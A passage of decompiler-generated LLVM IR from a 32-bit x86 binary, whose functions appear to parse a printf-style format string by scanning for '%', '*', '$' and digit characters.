  %v2_804c791 = inttoptr i32 %v1_804c791 to i32*
  %v3_804c791 = load i32, i32* %v2_804c791, align 4
  store i32 %v3_804c791, i32* %eax.global-to-local, align 4
  %v2_804c794 = icmp slt i32 %v3_804c791, 0
  %v1_804c796 = icmp eq i1 %v2_804c794, false
  br i1 %v1_804c796, label %dec_label_pc_804c7ac, label %dec_label_pc_804c798

dec_label_pc_804c798:                             ; preds = %dec_label_pc_804c791
  %v1_804c798 = add i32 %v10_804c798, 16
  %v2_804c798 = inttoptr i32 %v1_804c798 to i32*
  %v3_804c798 = load i32, i32* %v2_804c798, align 4
  %v4_804c798 = or i32 %v3_804c798, 8
  store i32 %v4_804c798, i32* %v2_804c798, align 4
  %v0_804c79c = load i32, i32* @ecx, align 4
  %v1_804c79c = add i32 %v0_804c79c, 16
  %v2_804c79c = inttoptr i32 %v1_804c79c to i32*
  %v3_804c79c = load i32, i32* %v2_804c79c, align 4
  %v4_804c79c = and i32 %v3_804c79c, -2
  store i32 %v4_804c79c, i32* %v2_804c79c, align 4
  %v0_804c7a0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c7a0 = sub i32 0, %v0_804c7a0
  store i32 %v1_804c7a0, i32* %eax.global-to-local, align 4
  %v1_804c7a2 = load i32, i32* @ecx, align 4
  %v2_804c7a2 = add i32 %v1_804c7a2, 8
  %v3_804c7a2 = inttoptr i32 %v2_804c7a2 to i32*
  store i32 %v1_804c7a0, i32* %v3_804c7a2, align 4
  %v0_804c7a5 = load i32, i32* @ecx, align 4
  %v1_804c7a5 = add i32 %v0_804c7a5, 20
  %v2_804c7a5 = inttoptr i32 %v1_804c7a5 to i32*
  store i32 32, i32* %v2_804c7a5, align 4
  %v0_804c7ae.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c7ac

dec_label_pc_804c7ac:                             ; preds = %dec_label_pc_804c791, %dec_label_pc_804c798
  %v0_804c7ae = phi i32 [ %v3_804c791, %dec_label_pc_804c791 ], [ %v0_804c7ae.pre, %dec_label_pc_804c798 ]
  %v2_804c7ac = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804c7ac, i32* @ebx, align 4
  ret i32 %v0_804c7ae

; uselistorder directives
  uselistorder i32 %v3_804c787, { 1, 0 }
  uselistorder i32 %v3_804c770, { 1, 0 }
  uselistorder i32 %v1_804c75b, { 2, 1, 0 }
  uselistorder i32 %v1_804c75c, { 0, 2, 1 }
  uselistorder i32 %v3_804c6f4, { 1, 0, 2 }
  uselistorder i32* %v2_804c6f4, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_804c6ef, { 1, 0 }
  uselistorder i32 %v6_804c6eb, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_804c6eb22, { 1, 0 }
  uselistorder i1 %v1_804c76a, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 1, 2, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 6, 2, 3, 4, 5, 7 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 5, 8, 7, 6 }
  uselistorder label %dec_label_pc_804c7ac, { 1, 0 }
  uselistorder label %dec_label_pc_804c791, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804c77a, { 1, 0 }
  uselistorder label %dec_label_pc_804c75b, { 1, 0 }
  uselistorder label %dec_label_pc_804c758, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804c756, { 1, 0 }
  uselistorder label %dec_label_pc_804c74e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c6eb, { 1, 0 }
  uselistorder label %dec_label_pc_804c6e7, { 1, 0 }
  uselistorder label %dec_label_pc_804c6cd, { 1, 0 }
}

define i32 @function_804c7b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_804c7b0:
  %v0_804c7b0 = load i32, i32* @eax, align 4
  br label %dec_label_pc_804c7b7

dec_label_pc_804c7b7:                             ; preds = %dec_label_pc_804c7b7, %dec_label_pc_804c7b0
  %v0_804c7b7 = phi i32 [ ptrtoint (i8** @global_var_8053756.123 to i32), %dec_label_pc_804c7b0 ], [ %v1_804c7b7, %dec_label_pc_804c7b7 ]
  %v1_804c7b7 = add i32 %v0_804c7b7, -2
  %v1_804c7ba = inttoptr i32 %v1_804c7b7 to i16*
  %v2_804c7ba = load i16, i16* %v1_804c7ba, align 2
  %v3_804c7ba = sext i16 %v2_804c7ba to i32
  %v12_804c7bd = icmp ne i32 %v3_804c7ba, %v0_804c7b0
  %v6_804c7c7 = icmp ugt i32 %v1_804c7b7, ptrtoint (i32* @global_var_805373e.124 to i32)
  %or.cond = and i1 %v6_804c7c7, %v12_804c7bd
  br i1 %or.cond, label %dec_label_pc_804c7b7, label %dec_label_pc_804c7c9

dec_label_pc_804c7c9:                             ; preds = %dec_label_pc_804c7b7
  %.pre = add i32 %v0_804c7b7, -134559552
  %v2_804c7cf = sdiv i32 %.pre, 2
  store i32 %v2_804c7cf, i32* @edx, align 4
  %v1_804c7d1 = add i32 %v2_804c7cf, ptrtoint (i8** @global_var_8053756.123 to i32)
  %v2_804c7d1 = inttoptr i32 %v1_804c7d1 to i8*
  %v3_804c7d1 = load i8, i8* %v2_804c7d1, align 1
  %v4_804c7d1 = zext i8 %v3_804c7d1 to i32
  ret i32 %v4_804c7d1

; uselistorder directives
  uselistorder i32 %v2_804c7cf, { 1, 0 }
  uselistorder i32 %v1_804c7b7, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_8053756.123 to i32), { 1, 0 }
}

define i32 @function_804c7d9(i32* %arg1) local_unnamed_addr {
dec_label_pc_804c7d9:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804c7da = load i32, i32* @edi, align 4
  %v0_804c7db = load i32, i32* @esi, align 4
  %v0_804c7dc = load i32, i32* @ebx, align 4
  store i32 %v0_804c7dc, i32* %stack_var_-16, align 4
  %v4_804c7dc = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804c808 = add i32 %tmp76, 24
  %v2_804c808 = inttoptr i32 %v1_804c808 to i32*
  %v3_804c808 = load i32, i32* %v2_804c808, align 4
  store i32 %v3_804c808, i32* %eax.global-to-local, align 4
  %v1_804c80f = add i32 %tmp76, 16
  %v2_804c80f = inttoptr i32 %v1_804c80f to i32*
  %v3_804c80f = load i32, i32* %v2_804c80f, align 4
  %v1_804c812 = and i32 %v3_804c80f, 128
  %v2_804c812 = icmp eq i32 %v1_804c812, 0
  store i32 %v1_804c812, i32* %edi.global-to-local, align 4
  %v1_804c818 = icmp eq i1 %v2_804c812, false
  br i1 %v1_804c818, label %dec_label_pc_804c82b, label %dec_label_pc_804c81a

dec_label_pc_804c81a:                             ; preds = %dec_label_pc_804c7d9
  %v2_804c81a = load i32, i32* %arg1, align 4
  br label %dec_label_pc_804c878.outer

dec_label_pc_804c825:                             ; preds = %dec_label_pc_804c9b3
  %v1_804c825 = add i32 %v0_804c9b3.pre.pre, 1
  store i32 %v1_804c825, i32* @esi, align 4
  br label %dec_label_pc_804c9c3

dec_label_pc_804c82b:                             ; preds = %dec_label_pc_804c7d9
  %v15_804c7dd = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804c82d

dec_label_pc_804c82d:                             ; preds = %dec_label_pc_804c855.dec_label_pc_804c82d_crit_edge, %dec_label_pc_804c82b
  %v2_804c83e = phi i32 [ %v2_804c83e.pre, %dec_label_pc_804c855.dec_label_pc_804c82d_crit_edge ], [ %v15_804c7dd, %dec_label_pc_804c82b ]
  %v3_804c83e = phi i32 [ %v1_804c855, %dec_label_pc_804c855.dec_label_pc_804c82d_crit_edge ], [ 0, %dec_label_pc_804c82b ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804c831 = mul i32 %v3_804c83e, 4
  store i32 %v1_804c831, i32* @ecx, align 4
  %v2_804c838 = load i32, i32* %arg1, align 4
  store i32 %v2_804c838, i32* @edx, align 4
  %v2_804c83a = add i32 %v1_804c831, -4
  %v3_804c83a = add i32 %v2_804c83a, %v2_804c838
  %v4_804c83a = inttoptr i32 %v3_804c83a to i32*
  %v5_804c83a = load i32, i32* %v4_804c83a, align 4
  store i32 %v5_804c83a, i32* %eax.global-to-local, align 4
  %v1_804c83e = trunc i32 %v5_804c83a to i8
  %v4_804c83e = add i32 %v2_804c83e, 36
  %v5_804c83e = add i32 %v4_804c83e, %v3_804c83e
  %v6_804c83e = inttoptr i32 %v5_804c83e to i8*
  store i8 %v1_804c83e, i8* %v6_804c83e, align 1
  %v0_804c842 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c842 = urem i32 %v0_804c842, 256
  %v2_804c842 = load i32, i32* @ebx, align 4
  %v3_804c842 = and i32 %v2_804c842, -256
  %v4_804c842 = or i32 %v3_804c842, %v1_804c842
  store i32 %v4_804c842, i32* @ebx, align 4
  %v1_804c844 = mul i32 %v0_804c842, 16777216
  %v2_804c844 = sdiv i32 %v1_804c844, 16777216
  store i32 %v2_804c844, i32* %eax.global-to-local, align 4
  %v1_804c847 = load i32, i32* @edx, align 4
  %v2_804c847 = load i32, i32* @ecx, align 4
  %v3_804c847 = add i32 %v1_804c847, -4
  %v4_804c847 = add i32 %v3_804c847, %v2_804c847
  %v5_804c847 = inttoptr i32 %v4_804c847 to i32*
  %v6_804c847 = load i32, i32* %v5_804c847, align 4
  %v17_804c847 = icmp eq i32 %v2_804c844, %v6_804c847
  %v1_804c84b = icmp eq i1 %v17_804c847, false
  br i1 %v1_804c84b, label %dec_label_pc_804cb94, label %dec_label_pc_804c851

dec_label_pc_804c851:                             ; preds = %dec_label_pc_804c82d
  %v3_804c851 = trunc i32 %v0_804c842 to i8
  %v4_804c851 = icmp eq i8 %v3_804c851, 0
  br i1 %v4_804c851, label %dec_label_pc_804c85b, label %dec_label_pc_804c855

dec_label_pc_804c855:                             ; preds = %dec_label_pc_804c851
  %v0_804c855 = load i32, i32* %esi.global-to-local, align 4
  %v1_804c855 = add i32 %v0_804c855, 1
  store i32 %v1_804c855, i32* %esi.global-to-local, align 4
  %tmp175 = icmp ult i32 %v1_804c855, 32
  br i1 %tmp175, label %dec_label_pc_804c855.dec_label_pc_804c82d_crit_edge, label %dec_label_pc_804c85b

dec_label_pc_804c855.dec_label_pc_804c82d_crit_edge: ; preds = %dec_label_pc_804c855
  %v2_804c83e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c82d

dec_label_pc_804c85b:                             ; preds = %dec_label_pc_804c855, %dec_label_pc_804c851
  %v2_804c860 = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_804c878.outer

dec_label_pc_804c878.outer:                       ; preds = %dec_label_pc_804c85b, %dec_label_pc_804c81a, %dec_label_pc_804c995
  %v0_804c884.ph94 = phi i32 [ %v1_804c995, %dec_label_pc_804c995 ], [ %v2_804c81a, %dec_label_pc_804c81a ], [ %v2_804c860, %dec_label_pc_804c85b ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_804c995 ], [ %tmp66, %dec_label_pc_804c81a ], [ %tmp66, %dec_label_pc_804c85b ]
  %stack_var_-96.1.ph = phi i32 [ %v0_804c81e, %dec_label_pc_804c995 ], [ 0, %dec_label_pc_804c81a ], [ 0, %dec_label_pc_804c85b ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_804c995 ], [ %v3_804c808, %dec_label_pc_804c81a ], [ %v3_804c808, %dec_label_pc_804c85b ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_804c995 ], [ 0, %dec_label_pc_804c81a ], [ 0, %dec_label_pc_804c85b ]
  %v7_804c87f = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_804c87f = trunc i64 %v7_804c87f to i32
  %v2_804c887 = add i32 %v8_804c87f, 80
  br label %dec_label_pc_804c878

dec_label_pc_804c878:                             ; preds = %dec_label_pc_804c878.outer, %dec_label_pc_804c935
  %v0_804c884 = phi i32 [ %v0_804c942, %dec_label_pc_804c935 ], [ %v0_804c884.ph94, %dec_label_pc_804c878.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_804c935 ], [ %stack_var_-32.1.ph, %dec_label_pc_804c878.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_804c935 ], [ %stack_var_-88.1.ph, %dec_label_pc_804c878.outer ]
  store i32 %v0_804c884, i32* @edx, align 4
  store i32 %v0_804c884, i32* @esi, align 4
  %v1_804c87a = inttoptr i32 %v0_804c884 to i8*
  %v2_804c87a = load i8, i8* %v1_804c87a, align 1
  %v11_804c87a = icmp eq i8 %v2_804c87a, 42
  %v1_804c87d = icmp eq i1 %v11_804c87a, false
  br i1 %v1_804c87d, label %dec_label_pc_804c88f, label %dec_label_pc_804c87f

dec_label_pc_804c87f:                             ; preds = %dec_label_pc_804c878
  store i32 %v8_804c87f, i32* %eax.global-to-local, align 4
  %v1_804c884 = add i32 %v0_804c884, 1
  store i32 %v1_804c884, i32* @esi, align 4
  %v0_804c887 = load i32, i32* @esp, align 4
  %v3_804c887 = add i32 %v2_804c887, %v0_804c887
  %v4_804c887 = inttoptr i32 %v3_804c887 to i32*
  store i32 0, i32* %v4_804c887, align 4
  %v0_804c8a9.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c88f

dec_label_pc_804c88f:                             ; preds = %dec_label_pc_804c878, %dec_label_pc_804c87f
  %v0_804c8a9.pre = phi i32 [ %v0_804c884, %dec_label_pc_804c878 ], [ %v0_804c8a9.pre.pre, %dec_label_pc_804c87f ]
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_804c891 = load i32, i32* inttoptr (i32 134570112 to i32*), align 128
  store i32 %v0_804c891, i32* %ebp.global-to-local, align 4
  %v4_804c8a9.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804c8a9124 = inttoptr i32 %v0_804c8a9.pre to i8*
  %v2_804c8a9125 = load i8, i8* %v1_804c8a9124, align 1
  %v3_804c8a9126 = zext i8 %v2_804c8a9125 to i32
  %v5_804c8a9127 = and i32 %v4_804c8a9.pre, -256
  %v6_804c8a9128 = or i32 %v3_804c8a9126, %v5_804c8a9127
  store i32 %v6_804c8a9128, i32* %eax.global-to-local, align 4
  %v2_804c8ab129 = sext i8 %v2_804c8a9125 to i32
  store i32 %v2_804c8ab129, i32* @ecx, align 4
  %v2_804c8ae130 = mul nsw i32 %v2_804c8ab129, 2
  %v3_804c8ae131 = add i32 %v2_804c8ae130, %v0_804c891
  %v4_804c8ae132 = inttoptr i32 %v3_804c8ae131 to i8*
  %v5_804c8ae133 = load i8, i8* %v4_804c8ae132, align 1
  %v6_804c8ae134 = and i8 %v5_804c8ae133, 8
  %v7_804c8ae135 = icmp eq i8 %v6_804c8ae134, 0
  %v1_804c8b3136 = icmp eq i1 %v7_804c8ae135, false
  br i1 %v1_804c8b3136, label %dec_label_pc_804c899, label %dec_label_pc_804c8b5

dec_label_pc_804c899:                             ; preds = %dec_label_pc_804c88f, %dec_label_pc_804c8a8
  %v2_804c8ab140 = phi i32 [ %v2_804c8ab, %dec_label_pc_804c8a8 ], [ %v2_804c8ab129, %dec_label_pc_804c88f ]
  %v6_804c8a9139 = phi i32 [ %v6_804c8a9, %dec_label_pc_804c8a8 ], [ %v6_804c8a9128, %dec_label_pc_804c88f ]
  %v0_804c8a8138 = phi i32 [ %v1_804c8a8, %dec_label_pc_804c8a8 ], [ %v0_804c8a9.pre, %dec_label_pc_804c88f ]
  %v1_804c8a1137 = phi i32 [ %v0_804c8c332, %dec_label_pc_804c8a8 ], [ 0, %dec_label_pc_804c88f ]
  %v1_804c899 = add i32 %v1_804c8a1137, -4094
  %v6_804c899 = sub i32 4093, %v1_804c8a1137
  %v7_804c899 = and i32 %v6_804c899, %v1_804c8a1137
  %v8_804c899 = icmp slt i32 %v7_804c899, 0
  %v9_804c899 = icmp eq i32 %v1_804c899, 0
  %v10_804c899 = icmp slt i32 %v1_804c899, 0
  %v3_804c89f = icmp eq i1 %v10_804c899, %v8_804c899
  %v4_804c89f = icmp eq i1 %v9_804c899, false
  %v5_804c89f = and i1 %v4_804c89f, %v3_804c89f
  br i1 %v5_804c89f, label %dec_label_pc_804c8a8, label %dec_label_pc_804c8a1

dec_label_pc_804c8a1:                             ; preds = %dec_label_pc_804c899
  %v3_804c8a1 = mul i32 %v1_804c8a1137, 10
  store i32 %v3_804c8a1, i32* %eax.global-to-local, align 4
  %v2_804c8a4 = add i32 %v3_804c8a1, -48
  %v3_804c8a4 = add i32 %v2_804c8a4, %v2_804c8ab140
  store i32 %v3_804c8a4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804c8a8

dec_label_pc_804c8a8:                             ; preds = %dec_label_pc_804c899, %dec_label_pc_804c8a1
  %v0_804c8c332 = phi i32 [ %v1_804c8a1137, %dec_label_pc_804c899 ], [ %v3_804c8a4, %dec_label_pc_804c8a1 ]
  %v4_804c8a928 = phi i32 [ %v6_804c8a9139, %dec_label_pc_804c899 ], [ %v3_804c8a1, %dec_label_pc_804c8a1 ]
  %v1_804c8a8 = add i32 %v0_804c8a8138, 1
  store i32 %v1_804c8a8, i32* @esi, align 4
  %v1_804c8a9 = inttoptr i32 %v1_804c8a8 to i8*
  %v2_804c8a9 = load i8, i8* %v1_804c8a9, align 1
  %v3_804c8a9 = zext i8 %v2_804c8a9 to i32
  %v5_804c8a9 = and i32 %v4_804c8a928, -256
  %v6_804c8a9 = or i32 %v3_804c8a9, %v5_804c8a9
  store i32 %v6_804c8a9, i32* %eax.global-to-local, align 4
  %v2_804c8ab = sext i8 %v2_804c8a9 to i32
  store i32 %v2_804c8ab, i32* @ecx, align 4
  %v2_804c8ae = mul nsw i32 %v2_804c8ab, 2
  %v3_804c8ae = add i32 %v2_804c8ae, %v0_804c891
  %v4_804c8ae = inttoptr i32 %v3_804c8ae to i8*
  %v5_804c8ae = load i8, i8* %v4_804c8ae, align 1
  %v6_804c8ae = and i8 %v5_804c8ae, 8
  %v7_804c8ae = icmp eq i8 %v6_804c8ae, 0
  %v1_804c8b3 = icmp eq i1 %v7_804c8ae, false
  br i1 %v1_804c8b3, label %dec_label_pc_804c899, label %dec_label_pc_804c8b5

dec_label_pc_804c8b5:                             ; preds = %dec_label_pc_804c8a8, %dec_label_pc_804c88f
  %v1_804c8a1.lcssa = phi i32 [ 0, %dec_label_pc_804c88f ], [ %v0_804c8c332, %dec_label_pc_804c8a8 ]
  %v0_804c8a8.lcssa = phi i32 [ %v0_804c8a9.pre, %dec_label_pc_804c88f ], [ %v1_804c8a8, %dec_label_pc_804c8a8 ]
  %v2_804c8a9.lcssa = phi i8 [ %v2_804c8a9125, %dec_label_pc_804c88f ], [ %v2_804c8a9, %dec_label_pc_804c8a8 ]
  %v6_804c8a9.lcssa = phi i32 [ %v6_804c8a9128, %dec_label_pc_804c88f ], [ %v6_804c8a9, %dec_label_pc_804c8a8 ]
  %v0_804c8b5 = load i32, i32* @edx, align 4
  %v1_804c8b5 = add i32 %v0_804c8b5, -1
  %v2_804c8b5 = inttoptr i32 %v1_804c8b5 to i8*
  %v3_804c8b5 = load i8, i8* %v2_804c8b5, align 1
  %v12_804c8b5 = icmp eq i8 %v3_804c8b5, 37
  %v1_804c8b9 = icmp eq i1 %v12_804c8b5, false
  br i1 %v1_804c8b9, label %dec_label_pc_804c94c, label %dec_label_pc_804c8bf

dec_label_pc_804c8bf:                             ; preds = %dec_label_pc_804c8b5
  %v10_804c8bf = icmp eq i8 %v2_804c8a9.lcssa, 36
  %v1_804c8c1 = icmp eq i1 %v10_804c8bf, false
  br i1 %v1_804c8c1, label %dec_label_pc_804c8f3, label %dec_label_pc_804c8c3

dec_label_pc_804c8c3:                             ; preds = %dec_label_pc_804c8bf
  %tmp89 = icmp slt i32 %v1_804c8a1.lcssa, 1
  br i1 %tmp89, label %dec_label_pc_804c8f3, label %dec_label_pc_804c8c7

dec_label_pc_804c8c7:                             ; preds = %dec_label_pc_804c8c3
  %v1_804c8c7 = add i32 %v0_804c8a8.lcssa, 1
  store i32 %v1_804c8c7, i32* @edx, align 4
  %v4_804c8ca = icmp eq i32 %stack_var_-88.1, 0
  br i1 %v4_804c8ca, label %dec_label_pc_804cb94, label %dec_label_pc_804c8d5

dec_label_pc_804c8d5:                             ; preds = %dec_label_pc_804c8c7
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_804c8dd = sub i32 %v1_804c8a1.lcssa, %stack_var_-88.1
  %v8_804c8dd = xor i32 %v1_804c8a1.lcssa, %stack_var_-88.1
  %v9_804c8dd = xor i32 %v2_804c8dd, %v1_804c8a1.lcssa
  %v10_804c8dd = and i32 %v9_804c8dd, %v8_804c8dd
  %v11_804c8dd = icmp slt i32 %v10_804c8dd, 0
  %v12_804c8dd = icmp eq i32 %v2_804c8dd, 0
  %v13_804c8dd = icmp slt i32 %v2_804c8dd, 0
  %v3_804c8df = icmp ne i1 %v13_804c8dd, %v11_804c8dd
  %v4_804c8df = or i1 %v12_804c8dd, %v3_804c8df
  %stack_var_-88.1.v0_804c8e1 = select i1 %v4_804c8df, i32 %stack_var_-88.1, i32 %v1_804c8a1.lcssa
  br label %dec_label_pc_804c8ef

dec_label_pc_804c8ef:                             ; preds = %dec_label_pc_804c903, %dec_label_pc_804c8d5, %dec_label_pc_804c907
  %v0_804c8ef = phi i32 [ %v1_804c8c7, %dec_label_pc_804c8d5 ], [ %v0_804c8b5, %dec_label_pc_804c907 ], [ %v0_804c8b5, %dec_label_pc_804c903 ]
  %stack_var_-32.2 = phi i32 [ %v1_804c8a1.lcssa, %dec_label_pc_804c8d5 ], [ %stack_var_-32.1, %dec_label_pc_804c907 ], [ %stack_var_-32.1, %dec_label_pc_804c903 ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_804c8e1, %dec_label_pc_804c8d5 ], [ 0, %dec_label_pc_804c907 ], [ 0, %dec_label_pc_804c903 ]
  store i32 %v0_804c8ef, i32* @esi, align 4
  br label %dec_label_pc_804c916

dec_label_pc_804c8f3:                             ; preds = %dec_label_pc_804c8c3, %dec_label_pc_804c8bf
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_804c903, label %dec_label_pc_804c8fa

dec_label_pc_804c8fa:                             ; preds = %dec_label_pc_804c8f3
  %v10_804c8fa = icmp eq i8 %v2_804c8a9.lcssa, 109
  br i1 %v10_804c8fa, label %dec_label_pc_804c94c, label %dec_label_pc_804cb94

dec_label_pc_804c903:                             ; preds = %dec_label_pc_804c8f3
  %tmp176 = icmp ugt i32 %v0_804c8a8.lcssa, %v0_804c8b5
  br i1 %tmp176, label %dec_label_pc_804c907, label %dec_label_pc_804c8ef

dec_label_pc_804c907:                             ; preds = %dec_label_pc_804c903
  %v1_804c907 = inttoptr i32 %v0_804c8b5 to i8*
  %v2_804c907 = load i8, i8* %v1_804c907, align 1
  %v8_804c907 = icmp eq i8 %v2_804c907, 48
  br i1 %v8_804c907, label %dec_label_pc_804c8ef, label %dec_label_pc_804c94c

dec_label_pc_804c916:                             ; preds = %dec_label_pc_804c927, %dec_label_pc_804c8ef
  %v0_804c942 = phi i32 [ %v1_804c927, %dec_label_pc_804c927 ], [ %v0_804c8ef, %dec_label_pc_804c8ef ]
  %v4_804c92035 = phi i32 [ %v6_804c920, %dec_label_pc_804c927 ], [ %v6_804c8a9.lcssa, %dec_label_pc_804c8ef ]
  store i32 ptrtoint ([8 x i8]* @global_var_8053736.127 to i32), i32* %edx.global-to-local, align 4
  %v1_804c923 = inttoptr i32 %v0_804c942 to i8*
  br label %dec_label_pc_804c920

dec_label_pc_804c920:                             ; preds = %dec_label_pc_804c931, %dec_label_pc_804c916
  %v4_804c920 = phi i32 [ %v4_804c92035, %dec_label_pc_804c916 ], [ %v6_804c920, %dec_label_pc_804c931 ]
  %v0_804c922 = phi i32 [ ptrtoint ([8 x i8]* @global_var_8053736.127 to i32), %dec_label_pc_804c916 ], [ %v1_804c922, %dec_label_pc_804c931 ]
  %v0_804c931 = phi i32 [ 1, %dec_label_pc_804c916 ], [ %v2_804c931, %dec_label_pc_804c931 ]
  store i32 %v0_804c931, i32* @ecx, align 4
  %v1_804c920 = inttoptr i32 %v0_804c922 to i8*
  %v2_804c920 = load i8, i8* %v1_804c920, align 1
  %v3_804c920 = zext i8 %v2_804c920 to i32
  %v5_804c920 = and i32 %v4_804c920, -256
  %v6_804c920 = or i32 %v3_804c920, %v5_804c920
  store i32 %v6_804c920, i32* %eax.global-to-local, align 4
  %v1_804c922 = add i32 %v0_804c922, 1
  store i32 %v1_804c922, i32* @edx, align 4
  %v2_804c923 = load i8, i8* %v1_804c923, align 1
  %v15_804c923 = icmp eq i8 %v2_804c923, %v2_804c920
  %v1_804c925 = icmp eq i1 %v15_804c923, false
  br i1 %v1_804c925, label %dec_label_pc_804c92c, label %dec_label_pc_804c927

dec_label_pc_804c927:                             ; preds = %dec_label_pc_804c920
  %v1_804c927 = add i32 %v0_804c942, 1
  store i32 %v1_804c927, i32* @esi, align 4
  %v0_804c928 = load i32, i32* %edi.global-to-local, align 4
  %v2_804c928 = or i32 %v0_804c928, %v0_804c931
  store i32 %v2_804c928, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804c916

dec_label_pc_804c92c:                             ; preds = %dec_label_pc_804c920
  %v1_804c92c = inttoptr i32 %v1_804c922 to i8*
  %v2_804c92c = load i8, i8* %v1_804c92c, align 1
  %v3_804c92c = icmp eq i8 %v2_804c92c, 0
  br i1 %v3_804c92c, label %dec_label_pc_804c935, label %dec_label_pc_804c931

dec_label_pc_804c931:                             ; preds = %dec_label_pc_804c92c
  %v2_804c931 = mul i32 %v0_804c931, 2
  br label %dec_label_pc_804c920

dec_label_pc_804c935:                             ; preds = %dec_label_pc_804c92c
  %v0_804c935 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804c939 = udiv i32 %v0_804c935, 2
  %v1_804c939.not = or i32 %v1_804c939, -6
  %v1_804c93e = xor i32 %v1_804c939.not, 5
  store i32 %v1_804c93e, i32* %eax.global-to-local, align 4
  %v2_804c940 = and i32 %v1_804c93e, %v0_804c935
  store i32 %v2_804c940, i32* %edi.global-to-local, align 4
  %v1_804c942 = add i32 %v0_804c942, -1
  %v2_804c942 = inttoptr i32 %v1_804c942 to i8*
  %v3_804c942 = load i8, i8* %v2_804c942, align 1
  %v12_804c942 = icmp eq i8 %v3_804c942, 37
  %v1_804c946 = icmp eq i1 %v12_804c942, false
  br i1 %v1_804c946, label %dec_label_pc_804c878, label %dec_label_pc_804c94c

dec_label_pc_804c94c:                             ; preds = %dec_label_pc_804c907, %dec_label_pc_804c935, %dec_label_pc_804c8b5, %dec_label_pc_804c8fa
  %v0_804c96f = phi i32 [ %v1_804c8a1.lcssa, %dec_label_pc_804c8fa ], [ %v1_804c8a1.lcssa, %dec_label_pc_804c907 ], [ 0, %dec_label_pc_804c935 ], [ %v1_804c8a1.lcssa, %dec_label_pc_804c8b5 ]
  %v1_804c978 = phi i32 [ %v0_804c8a8.lcssa, %dec_label_pc_804c8fa ], [ %v0_804c8a8.lcssa, %dec_label_pc_804c907 ], [ %v0_804c942, %dec_label_pc_804c935 ], [ %v0_804c8a8.lcssa, %dec_label_pc_804c8b5 ]
  %v0_804c975 = phi i32 [ %v0_804c8b5, %dec_label_pc_804c8fa ], [ %v0_804c8b5, %dec_label_pc_804c907 ], [ %v1_804c922, %dec_label_pc_804c935 ], [ %v0_804c8b5, %dec_label_pc_804c8b5 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_804c8fa ], [ %stack_var_-32.1, %dec_label_pc_804c907 ], [ %stack_var_-32.2, %dec_label_pc_804c935 ], [ %stack_var_-32.1, %dec_label_pc_804c8b5 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_804c8fa ], [ 0, %dec_label_pc_804c907 ], [ %stack_var_-88.2, %dec_label_pc_804c935 ], [ %stack_var_-88.1, %dec_label_pc_804c8b5 ]
  %v1_804c94c = inttoptr i32 %v0_804c975 to i8*
  %v2_804c94c = load i8, i8* %v1_804c94c, align 1
  %v11_804c94c = icmp eq i8 %v2_804c94c, 42
  %v1_804c94f = icmp eq i1 %v11_804c94c, false
  br i1 %v1_804c94f, label %dec_label_pc_804c985, label %dec_label_pc_804c951

dec_label_pc_804c951:                             ; preds = %dec_label_pc_804c94c
  %v4_804c951 = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_804c951, label %dec_label_pc_804c975, label %dec_label_pc_804c958

dec_label_pc_804c958:                             ; preds = %dec_label_pc_804c951
  %v1_804c958 = inttoptr i32 %v1_804c978 to i8*
  %v2_804c958 = load i8, i8* %v1_804c958, align 1
  %v11_804c958 = icmp eq i8 %v2_804c958, 36
